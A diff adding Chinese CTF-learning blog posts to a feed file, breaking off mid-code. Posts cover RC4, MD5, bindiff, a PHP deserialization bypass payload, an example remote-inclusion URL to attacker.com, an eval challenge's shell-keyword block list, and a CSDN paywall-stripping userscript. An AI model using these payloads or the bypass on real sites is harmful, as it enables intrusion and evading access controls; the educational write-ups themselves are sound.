@@ -4,6 +4,356 @@
   
   
   <entry>
+    <title>rc4</title>
+    <link href="/2024/10/28/rc4/"/>
+    <url>/2024/10/28/rc4/</url>
+    
+    <content type="html"><![CDATA[<h1 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h1><p>写题过程中会出现像rc4这种简单的对称加密算法，在此留下对应的解密脚本<br>由于初始化的s盒和产生的密钥流是由固定的密钥确定，并且加密的本质是异或所以为对称的<br>rc4加密主要分为三个部分</p><ul><li>初始化s盒</li><li>生成密钥流</li><li>加密</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">KSA</span>(<span class="hljs-params">key</span>):<br>    key_length = <span class="hljs-built_in">len</span>(key)<br><br>    <span class="hljs-comment"># 初始化S盒</span><br>    S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + S[i] + key[i % key_length]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br><br>    <span class="hljs-keyword">return</span> S<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">PRGA</span>(<span class="hljs-params">S</span>):<br>    i = <span class="hljs-number">0</span><br>    j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + S[i]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>        K = S[(S[i] + S[j]) % <span class="hljs-number">256</span>]<br>        <span class="hljs-keyword">yield</span> K<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">RC4</span>(<span class="hljs-params">key, data</span>):<br>    S = KSA(key)<br>    keystream = PRGA(S)<br>    res = []<br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> data:<br>        res.append(c ^ <span class="hljs-built_in">next</span>(keystream))<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(res)<br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>逆向算法</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>reverse</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>hash</title>
+    <link href="/2024/10/28/hash/"/>
+    <url>/2024/10/28/hash/</url>
+    
+    <content type="html"><![CDATA[<h1 id="hash算法"><a href="#hash算法" class="headerlink" title="hash算法"></a>hash算法</h1><p>打算了解一下各个hash算法的细节，防止在看到伪代码时不认识</p><h2 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h2><h3 id="MD5加密原理步骤"><a href="#MD5加密原理步骤" class="headerlink" title="MD5加密原理步骤"></a>MD5加密原理步骤</h3><ol><li>在MD5算法中，首先需要对信息进行填充，使其位长对512求余的结果等于448，并且填充必须进行(N*512+448)</li><li>初始化变量,以大端字节序来表示，他们分别为： A&#x3D;0x01234567，B&#x3D;0x89ABCDEF，C&#x3D;0xFEDCBA98，D&#x3D;0x76543210（每一个变量给出的数值是高字节存于内存低地址，低字节存于内存高地址，即大端字节序。在程序中变量A、B、C、D的值分别为0x67452301，0xEFCDAB89，0x98BADCFE，0x10325476）</li><li>处理分组数据<br>以下是每次操作中用到的四个非线性函数（每轮一个）。<br>F( X ,Y ,Z ) &#x3D; ( X &amp; Y ) | ( (<del>X) &amp; Z )<br>G( X ,Y ,Z ) &#x3D; ( X &amp; Z ) | ( Y &amp; (</del>Z) )<br>H( X ,Y ,Z ) &#x3D;X ^ Y ^ Z<br>I( X ,Y ,Z ) &#x3D;Y ^ ( X | (~Z) )</li></ol><ul><li>MD5 是一种基于迭代和压缩的哈希函数，其核心是对输入数据进行多轮的位运算和逻辑操作。</li><li>常量值：MD5 使用特定的常量（如 0x67452301, 0xEFCDAB89 等）在计算过程中。如果在代码中看到这些特定的常量，特别是在加法操作中，通常指向 MD5 或类似算法。</li><li>处理输入数据的方式：MD5 通常处理输入数据为 512 位（64 字节）块，将每个块分为多个 32 位（4 字节）单元进行处理。</li></ul>]]></content>
+    
+    
+    <categories>
+      
+      <category>逆向算法</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>reverse</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>bindiff</title>
+    <link href="/2024/10/28/bindiff/"/>
+    <url>/2024/10/28/bindiff/</url>
+    
+    <content type="html"><![CDATA[<h1 id="用bindiff来显示二进制文件的区别"><a href="#用bindiff来显示二进制文件的区别" class="headerlink" title="用bindiff来显示二进制文件的区别"></a>用bindiff来显示二进制文件的区别</h1><p>你是否在面对收到攻击的二进制文件无法比对，看着两个文件而陷入迷茫，不知如何分析，沉沦在函数之海无法自拔，找不到patcher前后的区别，那么bindiff可以帮助你。</p><h3 id="1-自行安装"><a href="#1-自行安装" class="headerlink" title="1. 自行安装"></a>1. 自行安装</h3><h3 id="2-使用"><a href="#2-使用" class="headerlink" title="2.使用"></a>2.使用</h3><p>首先我们打开一个我们所需要分析的软件，在ida完成分析之后我们退出将对应的.ida64包文件保存，然后加载patcher后的文件，在ida中键入crtl+6，使用bindiff插件<br><img src="https://gitee.com/fogpost/photo/raw/master/202410281503232.png" srcset="/img/loading.gif" lazyload><br>选择Diff DAtabase，选择刚刚保存的.ida64文件,出现对应的对比框<br><img src="https://gitee.com/fogpost/photo/raw/master/202410281504805.png" srcset="/img/loading.gif" lazyload><br>在这个绿色框口下我们发现，在最下方的函数extract_dirs_from_files，与原来的文件对比，有仅0.84的相似度，我们便可以知道两个二进制文件在这个函数发生了区别<br><img src="https://gitee.com/fogpost/photo/raw/master/202410281506283.png" srcset="/img/loading.gif" lazyload><br>查看函数,在patcher中发现多了如下一个分支</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c++">LABEL_7:<br>        <span class="hljs-keyword">if</span> ( v9 &amp;&amp; !v9[<span class="hljs-number">1</span>] )<br>        &#123;<br>          *(_QWORD *)&amp;lmao[<span class="hljs-number">8</span>] = <span class="hljs-number">0x3F7D132A2A252822LL</span>;<br>          *(_QWORD *)lmao = <span class="hljs-number">0x7D2E370A180F1604LL</span>;<br>          *(_QWORD *)&amp;lmao[<span class="hljs-number">24</span>] = <span class="hljs-number">0x31207C7C381320LL</span>;<br>          *(_QWORD *)&amp;lmao[<span class="hljs-number">16</span>] = <span class="hljs-number">0x392A7F3F39132D13LL</span>;<br>          v18 = lmao;<br>          <span class="hljs-keyword">do</span><br>            *v18++ ^= **(_BYTE **)v7;<br>          <span class="hljs-keyword">while</span> ( &amp;lmao[<span class="hljs-number">31</span>] != v18 );<br>          <span class="hljs-built_in">puts</span>(lmao);<br>        &#125;<br>        <span class="hljs-keyword">goto</span> LABEL_9;<br>      &#125;<br>      <span class="hljs-keyword">if</span> ( !dirname )<br>        <span class="hljs-keyword">goto</span> LABEL_21;<br>      component = <span class="hljs-built_in">last_component</span>(*(<span class="hljs-type">const</span> <span class="hljs-type">char</span> **)v7);<br>      <span class="hljs-keyword">if</span> ( *component == <span class="hljs-number">46</span> )<br>      &#123;<br>        v17 = component[(component[<span class="hljs-number">1</span>] == <span class="hljs-number">46</span>) + <span class="hljs-number">1</span>];<br>        <span class="hljs-keyword">if</span> ( !v17 || v17 == <span class="hljs-number">47</span> )<br>          <span class="hljs-keyword">goto</span> LABEL_7;<br>      &#125;<br>      <span class="hljs-keyword">if</span> ( *v9 == <span class="hljs-number">47</span> )<br>      &#123;<br></code></pre></td></tr></table></figure><p>我们经过cyberchef的函数爆破，来获得最终的数据，注意在数组中存在大小端序的问题<br><img src="https://gitee.com/fogpost/photo/raw/master/202410281511684.png" srcset="/img/loading.gif" lazyload><br><a href="https://www.nssctf.cn/problem/3687">题目来源</a></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>ctf</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>tool</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>反序列化例题</title>
+    <link href="/2024/10/27/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
+    <url>/2024/10/27/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
+    
+    <content type="html"><![CDATA[<p>前期我们先以题带学，进行一下熟悉</p><h3 id="例题1-SWPUCTF-2021-新生赛-no-wakeup"><a href="#例题1-SWPUCTF-2021-新生赛-no-wakeup" class="headerlink" title="例题1 [SWPUCTF 2021 新生赛]no_wakeup"></a>例题1 [SWPUCTF 2021 新生赛]no_wakeup</h3><p>直接看到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">&quot;class.php&quot;</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HaHaHa</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$admin</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$passwd</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;admin =<span class="hljs-string">&quot;user&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;passwd = <span class="hljs-string">&quot;123456&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;passwd = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;passwd);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;admin === <span class="hljs-string">&quot;admin&quot;</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;passwd === <span class="hljs-string">&quot;wllm&quot;</span>)&#123;<br>                <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;passwd;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;No wake up&quot;</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><span class="hljs-variable">$Letmeseesee</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>];<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$Letmeseesee</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>经过wp发现，在调用反序列化时，会自动执行_wakeip()导致passwd被sha1加密，并且不可逆，所以我们要考虑_wakeip()的让绕过</p><ul><li>知识点：php特性，当反序列化字符串中，表示对象属性个数的值大于真实属性个数时，会跳过__wakeup()函数的执行。</li></ul><pre><code class="php">$aa = new HaHaHa();$aa-&gt;admin = &quot;admin&quot;;$aa-&gt;passwd = &quot;wllm&quot;;$stus = serialize($aa);print_r($stus);</code></pre><p>O:6:”HaHaHa”:2:{s:5:”admin”;s:5:”admin”;s:6:”passwd”;s:4:”wllm”;}<br>序列化之后我们可以改变参数数量,上传即可<br>O:6:”HaHaHa”:3:{s:5:”admin”;s:5:”admin”;s:6:”passwd”;s:4:”wllm”;}</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>网络</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>php</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>电子榨菜</title>
+    <link href="/2024/10/27/%E7%94%B5%E5%AD%90%E6%A6%A8%E8%8F%9C/"/>
+    <url>/2024/10/27/%E7%94%B5%E5%AD%90%E6%A6%A8%E8%8F%9C/</url>
+    
+    <content type="html"><![CDATA[<h1 id="电子榨菜"><a href="#电子榨菜" class="headerlink" title="电子榨菜"></a>电子榨菜</h1><h2 id="2024-10-26-23-06-28"><a href="#2024-10-26-23-06-28" class="headerlink" title="2024-10-26 23:06:28"></a>2024-10-26 23:06:28</h2><p>写写干了什么，现在好想玩星际啊，不想写东西了，直接开完，这个geekcode还会接我话好玩的，星际推荐玩星际酒馆，不过在写这个东西的时候突然发现，一个功能，就是vscode的自动换行功能直接搜就行好用的，会根据现在的页面大小自动换行，星际战役好贵啊250，早十年玩就好了，还会送的，要不要写写明天干什么呢。，加个评论，看看这些好玩吧<br><img src="https://gitee.com/fogpost/photo/raw/master/202410262318542.png" srcset="/img/loading.gif" lazyload></p><h2 id="2024-10-29"><a href="#2024-10-29" class="headerlink" title="2024-10-29"></a>2024-10-29</h2><p>今天的网鼎杯也是坐上一次大牢了，八个小时满打满算直接看了5个小时的空挡，这个是安卓，也是坐上牢，我发现逆向领域简直就是一个乙游大世界，想要成熟稳重有我们的windows逆向，想要幽默风趣有我们的安卓逆向，想要老公姐有我们的硬件逆向，我们逆向领域真是吃得太好了，妈的刚刚发生了一件大事，狗吧微软把我的贴子吃掉了，php木马的篇帖子直接被删了没办法还原，看样子以后还是尽量用图片把，晚上陪337寝室出去嗨皮了一把，被ylq坑惨了，🐕吧带的什么破地方，吃不得，下次带我的好朋友hy去吃，明天开始看看逆向核心原理吧，沉淀得太少喽。<br><img src="https://gitee.com/fogpost/photo/raw/master/202410292358898.jpg" srcset="/img/loading.gif" lazyload></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>电子榨菜</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>snake</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>solidity</title>
+    <link href="/2024/10/25/solidity/"/>
+    <url>/2024/10/25/solidity/</url>
+    
+    <content type="html"><![CDATA[<h1 id="Solidity代码块"><a href="#Solidity代码块" class="headerlink" title="Solidity代码块"></a>Solidity代码块</h1><p>真不想写这个啊，没见过的代码，直接搜的到时候背就行</p><h2 id="整型概念"><a href="#整型概念" class="headerlink" title="整型概念"></a>整型概念</h2><p>int &#x2F; uint ：分别表示有符号和无符号的不同位数的整型变量。 支持关键字 uint8 到 uint256 （无符号，从 8 位到 256 位）以及 int8 到 int256，以 8 位为步长递增。 uint 和 int 分别是 uint256 和 int256 的别名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity &gt;=0.4.21 &lt;=0.8.0<br><br>contract MatchTest&#123;<br>    function add(uint i,uint j) pure public returns(uint)&#123;<br>        return i + j;<br>    &#125;<br>    function sub(uint i,uint j) pure public returns(uint)&#123;<br>        return i - j;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>你看连识别都用不了</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>web3</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>course</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>csdnvip</title>
+    <link href="/2024/10/25/csdnvip/"/>
+    <url>/2024/10/25/csdnvip/</url>
+    
+    <content type="html"><![CDATA[<h1 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h1><p>在最近的时候看csdn的垃圾文章老是弹出仅vip的情况，可喜可贺的是有大佬已经写了跳过脚本接下来我们将使用脚本来跳过这goshi的csdnvip检测</p><h1 id="脚本源码"><a href="#脚本源码" class="headerlink" title="脚本源码"></a>脚本源码</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// ==UserScript==</span><br><span class="hljs-comment">// @name         100%解锁CSDN文库vip文章阅读限制</span><br><span class="hljs-comment">// @namespace    http://tampermonkey.net/</span><br><span class="hljs-comment">// @version      2.2</span><br><span class="hljs-comment">// @description  CSDN文库阅读全文，去除VIP文章遮罩</span><br><span class="hljs-comment">// @author       Mrlimuyu</span><br><span class="hljs-comment">// @match        *://*.csdn.net/*</span><br><span class="hljs-comment">// @grant        none</span><br><span class="hljs-comment">// @license      yagiza</span><br><span class="hljs-comment">// @downloadURL https://update.greasyfork.org/scripts/495150/100%25%E8%A7%A3%E9%94%81CSDN%E6%96%87%E5%BA%93vip%E6%96%87%E7%AB%A0%E9%98%85%E8%AF%BB%E9%99%90%E5%88%B6.user.js</span><br><span class="hljs-comment">// @updateURL https://update.greasyfork.org/scripts/495150/100%25%E8%A7%A3%E9%94%81CSDN%E6%96%87%E5%BA%93vip%E6%96%87%E7%AB%A0%E9%98%85%E8%AF%BB%E9%99%90%E5%88%B6.meta.js</span><br><span class="hljs-comment">// ==/UserScript==</span><br><br>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-string">&#x27;use strict&#x27;</span>;<br><br>    <span class="hljs-keyword">const</span> <span class="hljs-title function_">adjustArticle</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>        <span class="hljs-comment">// 移除遮罩层和限制高度的内容</span><br>        <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">&#x27;.hide-article-box, .login-mark, .mask, .vip-caise&#x27;</span>).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">el</span> =&gt;</span> el.<span class="hljs-title function_">remove</span>());<br><br>        <span class="hljs-comment">// 展开被限制高度的内容</span><br>        <span class="hljs-keyword">const</span> articleContainer = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;.article_content&#x27;</span>);<br>        <span class="hljs-keyword">if</span> (articleContainer) &#123;<br>            articleContainer.<span class="hljs-property">style</span>.<span class="hljs-property">maxHeight</span> = <span class="hljs-string">&#x27;none&#x27;</span>;<br>            articleContainer.<span class="hljs-property">style</span>.<span class="hljs-property">height</span> = <span class="hljs-string">&#x27;auto&#x27;</span>;<br>        &#125;<br>    &#125;;<br><br>    <span class="hljs-comment">// 启用复制功能</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-title function_">enableCopy</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>        <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">oncopy</span> = <span class="hljs-literal">null</span>;<br>        <span class="hljs-variable language_">document</span>.<span class="hljs-property">oncopy</span> = <span class="hljs-literal">null</span>;<br>        <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">&#x27;*&#x27;</span>).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">el</span> =&gt;</span> &#123;<br>            el.<span class="hljs-property">style</span>.<span class="hljs-property">userSelect</span> = <span class="hljs-string">&#x27;auto&#x27;</span>;<br>            el.<span class="hljs-property">style</span>.<span class="hljs-property">webkitUserSelect</span> = <span class="hljs-string">&#x27;auto&#x27;</span>;<br>            el.<span class="hljs-property">style</span>.<span class="hljs-property">msUserSelect</span> = <span class="hljs-string">&#x27;auto&#x27;</span>;<br>            el.<span class="hljs-property">style</span>.<span class="hljs-property">mozUserSelect</span> = <span class="hljs-string">&#x27;auto&#x27;</span>;<br>        &#125;);<br>    &#125;;<br><br>    <span class="hljs-comment">// 使用MutationObserver来监视文档的变化</span><br>    <span class="hljs-keyword">const</span> observer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MutationObserver</span>(<span class="hljs-function">(<span class="hljs-params">mutations</span>) =&gt;</span> &#123;<br>        mutations.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">mutation</span>) =&gt;</span> &#123;<br>            <span class="hljs-keyword">if</span> (mutation.<span class="hljs-property">addedNodes</span>.<span class="hljs-property">length</span>) &#123;<br>                <span class="hljs-title function_">adjustArticle</span>();<br>                <span class="hljs-title function_">enableCopy</span>();<br>            &#125;<br>        &#125;);<br>    &#125;);<br><br>    observer.<span class="hljs-title function_">observe</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>, &#123;<br>        <span class="hljs-attr">childList</span>: <span class="hljs-literal">true</span>,<br>        <span class="hljs-attr">subtree</span>: <span class="hljs-literal">true</span><br>    &#125;);<br><br>    <span class="hljs-comment">// 页面加载时尝试执行一次</span><br>    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;load&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>        <span class="hljs-title function_">adjustArticle</span>();<br>        <span class="hljs-title function_">enableCopy</span>();<br>    &#125;);<br>&#125;)();<br></code></pre></td></tr></table></figure><h1 id="实现效果"><a href="#实现效果" class="headerlink" title="实现效果"></a>实现效果</h1><p>在我们成功加载脚本后，csdn的vip文章，仅限于可以查看部分原文的便可以查看剩余部分</p><h2 id="脚本前"><a href="#脚本前" class="headerlink" title="脚本前"></a>脚本前</h2><p><img src="https://gitee.com/fogpost/photo/raw/master/202410250839321.png" srcset="/img/loading.gif" lazyload></p><h2 id="脚本后"><a href="#脚本后" class="headerlink" title="脚本后"></a>脚本后</h2><p><img src="https://gitee.com/fogpost/photo/raw/master/202410250840351.png" srcset="/img/loading.gif" lazyload><br>但是果然垃圾csdn就没什么有用的部分，大部分都是小段垃圾</p><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>我想的是作为一个博客，应该就是在于能否传递有价值的信息和思想，而不是待着别人的文章就去抄然后发到网上，有些那种垃圾人就在自己的博客上写一些垃圾文章，然后发到csdn上，然后别人看到就点进去，浪费时间又看不到东西，写的时候要好好想想自己的这篇博客有什么效果，没效果的不如不写</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>工具</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>tool</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>NSSCTFweb2</title>
+    <link href="/2024/10/19/NSSCTFweb2/"/>
+    <url>/2024/10/19/NSSCTFweb2/</url>
+    
+    <content type="html"><![CDATA[<p>The future</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;File contents: <span class="hljs-subst">$data</span>&quot;</span>;<br><span class="hljs-comment">//朴实无华，拿来就用    </span><br>File contents: <br></code></pre></td></tr></table></figure><p>一个简单的FIV文件包含漏洞<br>本地文件包含（LFI）<br>潜在的远程文件包含（RFI）漏洞<br>如果 PHP 配置中 allow_url_fopen 和 allow_url_include 设置为 On，攻击者甚至可以通过 file 参数引入远程文件，执行远程的恶意代码。假如配置不当，攻击者可以通过这样的 URL 进行远程文件包含：<br><a href="http://example.com/vulnerable.php?file=http://attacker.com/malicious_code.php">http://example.com/vulnerable.php?file=http://attacker.com/malicious_code.php</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/sys|pas|read|file|ls|cat|tac| |head|tail|more|less|php|base|echo|cp|\$|\*|\+|\^|scan|\.|local|current|chr|crypt|show_source|high|readgzfile|dirname|time|next|all|hex2bin|im|shell/i&#x27;</span>,<span class="hljs-variable">$code</span>))&#123;<br>     <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);  <br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;img src=&quot;./dududadadudu.png&quot; alt=&quot;Top Image&quot; style=&quot;display: block; margin: 0 auto; max-width: 20%; height: auto;&quot;&gt;&#x27;</span>; <br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;audio controls&gt;&#x27;</span>;<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;source src=&quot;./dududadudada.mp3&quot; type=&quot;audio/mpeg&quot;&gt;&#x27;</span>;<br>         &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span 